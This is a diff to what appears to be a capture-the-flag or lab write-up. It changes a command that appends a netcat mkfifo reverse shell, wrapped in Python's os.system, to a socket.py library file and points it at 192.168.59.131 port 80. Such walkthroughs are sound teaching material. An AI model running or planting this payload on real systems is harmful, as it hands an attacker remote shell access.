@@ -174,7 +174,7 @@ which nc
 ![image](https://user-images.githubusercontent.com/43767555/203454997-2c92d5d6-9325-4a98-9e23-89e9b2c34734.png)
 
 ```
-echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.59.131 80 >/tmp/f' >> socket.py && tail -n 10 socket.py
+echo 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.59.131 80 >/tmp/f")' >> socket.py && tail -n 10 socket.py
 ```
 
 ![image](https://user-images.githubusercontent.com/43767555/203455333-7cacc5bd-72e6-4a22-ad10-70cb465abe84.png)
